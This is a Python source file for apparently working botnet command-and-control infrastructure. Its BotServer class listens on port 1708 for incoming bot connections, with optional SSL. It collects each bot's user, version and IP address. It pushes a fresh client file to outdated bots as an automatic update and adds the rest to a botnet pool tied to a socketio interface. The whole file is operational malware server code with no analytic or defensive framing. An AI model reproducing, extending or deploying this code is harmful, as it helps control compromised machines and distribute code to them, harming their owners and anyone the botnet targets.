from threading import Thread
from distutils.version import LooseVersion
import json
import os
import socket
import ssl

from server import formatsock
from server.client import client
from server.botnetclasses import Bot

MIN_CLIENT_VERSION = client.__version__


class BotServer(Thread):
    HOST = '0.0.0.0'
    PORT = 1708

    def __init__(self, botnet, socketio, certfile=None, keyfile=None):
        Thread.__init__(self)
        self.tcpsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.tcpsock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.tcpsock.bind((BotServer.HOST, BotServer.PORT))

        self.botnet = botnet
        self.socketio = socketio
        self.clientversion = LooseVersion(MIN_CLIENT_VERSION)

        self.ssl = certfile and keyfile
        self.certfile = certfile
        self.keyfile = keyfile

    def run(self):
        self.tcpsock.listen(5)
        while True:
            clientsock, (ip, port) = self.tcpsock.accept()
            clientsock.send(b'\x01' if self.ssl else b'\x00')
            if self.ssl:
                clientsock = ssl.wrap_socket(
                    clientsock,
                    server_side=True,
                    certfile=self.certfile,
                    keyfile=self.keyfile
                )
            clientformatsock = formatsock.FormatSocket(clientsock)
            print("[*] Accepting connection")
            msgbytes = clientformatsock.recv()
            host_info = json.loads(msgbytes.decode('UTF-8'))
            host_info['addr'] = ip

            user = host_info['user'].strip()
            botversion = LooseVersion(host_info['version'])

            if botversion < self.clientversion:
                # Autoupdate
                print("[*] Updating {} on version {}".format(user, botversion))
                bot = Bot(clientsock, host_info, self.socketio)
                bot.sendClientFile(open(os.path.abspath(client.__file__), 'rb'))
            else:
                print("[+] Received connection from {}".format(user))
                self.botnet.addConnection(user, clientsock, host_info, self.socketio)
